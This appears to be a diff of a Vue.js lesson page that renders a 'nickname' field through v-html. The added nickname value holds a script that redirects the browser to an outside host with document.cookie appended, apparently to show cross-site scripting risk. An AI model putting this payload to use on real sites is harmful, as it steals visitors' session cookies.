@@ -11,6 +11,7 @@
     <div id="app">
         <p>姓名：{{username}}</p>
         <p>年龄：{{age}}</p>
+        <p v-html="nickname">asdfasdf</p>
         <input type="text" v-bind:value="age" v-on:input="changeAge">
     </div>
     <script>
@@ -41,7 +42,9 @@
         //     testData.score = this.value;
         // }
 
-        let data = {username:'laoxie',age:18}
+        let data = {username:'laoxie',age:18,
+        nickname:'<div><strong>xiaoxie</strong><script>location.href="www.laoxie.com?data+"+document.cookie<\/script></div>'
+        }
        
         let vm = new Vue({
             el:'#app',
